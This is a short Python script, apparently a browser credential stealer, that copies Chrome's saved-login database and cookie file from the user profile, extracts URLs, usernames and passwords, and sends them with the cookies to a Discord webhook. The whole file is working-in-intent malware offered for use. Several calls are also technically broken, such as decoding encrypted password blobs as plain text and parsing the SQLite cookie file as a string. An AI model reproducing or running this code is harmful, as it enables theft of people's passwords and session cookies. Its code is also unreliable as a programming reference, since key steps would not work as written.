import os
import sqlite3
import shutil
import requests
from discord_webhook import DiscordWebhook
from shutil import which

# Locate the Chrome browser executable
chrome_path = which("chrome")

# Specify the path to the browser profile folder
browser_profile_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')

# Copy the browser's SQLite database to a temporary folder
temp_dir = "C:/Temp"
if not os.path.exists(temp_dir):
    os.mkdir(temp_dir)
db_path = os.path.join(temp_dir, "Login Data")
shutil.copyfile(os.path.join(browser_profile_path, "Login Data"), db_path)

# Connect to the SQLite database and extract passwords
conn = sqlite3.connect(db_path)
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
rows = cursor.fetchall()
passwords = []
for row in rows:
    password = {}
    password["url"] = row[0]
    password["username"] = row[1]
    password["password"] = bytes(row[2]).decode("utf-8")
    passwords.append(password)

# Extract cookies
cookies = []
cookie_path = os.path.join(browser_profile_path, "Cookies")
with open(cookie_path, "rb") as f:
    cookies_content = f.read()
cookies = requests.utils.dict_from_cookiejar(requests.utils.cookiejar_from_dict(requests.utils.dict_from_cookiejar(requests.utils.cookiejar_from_string(cookies_content.decode("utf-8")))))

# Send data to Discord webhook
webhook_url = "https://discord.com/api/webhooks/<your_webhook_url>"
webhook = DiscordWebhook(url=webhook_url, content={"Passwords": passwords, "Cookies": cookies})
response = webhook.execute()

# Delete the temporary database file
os.remove(db_path)
